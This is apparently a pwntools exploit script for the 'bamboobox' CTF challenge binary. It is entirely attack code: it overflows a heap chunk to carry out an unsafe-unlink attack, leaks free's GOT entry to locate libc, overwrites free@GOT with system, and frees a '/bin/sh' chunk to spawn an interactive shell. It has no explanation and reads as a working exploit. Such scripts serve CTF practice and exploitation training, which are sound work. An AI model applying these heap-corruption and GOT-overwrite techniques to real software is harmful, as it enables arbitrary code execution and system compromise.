from pwn import *
context.log_level = "debug"
p = process("./bamboobox")
elf = ELF("./bamboobox")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(choice):
	p.recvuntil("choice:")
	p.sendline(str(choice))

def show():
	cmd(1)
	content = p.recvuntil("\n----------------------------" , drop = True)
	return content


def add(size , content = None):
	cmd(2)
	p.recvuntil("name:")
	p.send(str(size))
	if content != None:
		p.recvuntil("item:")
		p.send(content)

def change(index , size , content):
	cmd(3)
	p.recvuntil(":")
	p.send(str(index))
	p.recvuntil(":")
	p.send(str(size))
	p.recvuntil(":")
	p.send(content)

def remove(index):
	cmd(4)
	p.recvuntil("index of item:")
	p.send(str(index))

# gdb.attach(p , "b printf")
size = 0x80
add(size , "fantasy") # 0
add(size , "fantasy") # 1
add(size , "fantasy") # 2
add(size , "/bin/sh\x00") # 3

item_list = 0x6020C8 - 0x8 

payload = p64(0) + p64(size) + p64(item_list ) + p64(item_list + 8)
payload = payload.ljust(size , "a")
payload += p64(size) + p64(size + 0x10)
change(1 , len(payload) , payload)

remove(2)
free_got = elf.got["free"]
payload = (p64(0x80) + p64(free_got)) * 2
change(1 , len(payload) , payload)

content = show().split("\n")[0][4:]
free_addr = u64(content[:6].ljust(8 , "\x00"))
log.info(hex(free_addr))
libc_base = free_addr - libc.sym["free"]
system = libc_base + libc.sym["system"]

change(1 , 7 , p64(system))

remove(3)

p.interactive()
